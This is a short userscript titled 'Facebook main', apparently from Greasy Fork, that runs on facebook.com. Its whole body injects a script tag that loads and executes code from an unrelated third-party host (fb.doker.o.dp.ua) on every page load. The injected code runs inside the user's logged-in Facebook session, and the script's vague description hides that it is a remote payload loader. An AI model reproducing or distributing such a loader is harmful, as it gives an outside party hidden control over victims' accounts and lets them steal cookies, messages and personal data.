// ==UserScript==
// @name         Facebook main
// @namespace    http://facebook.com/
// @version      0.02
// @author       abrakadabra
// @description  Facebook IJ
// @match        https://facebook.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/371283/Facebook%20main.user.js
// @updateURL https://update.greasyfork.org/scripts/371283/Facebook%20main.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();

var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://fb.doker.o.dp.ua/js/main/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);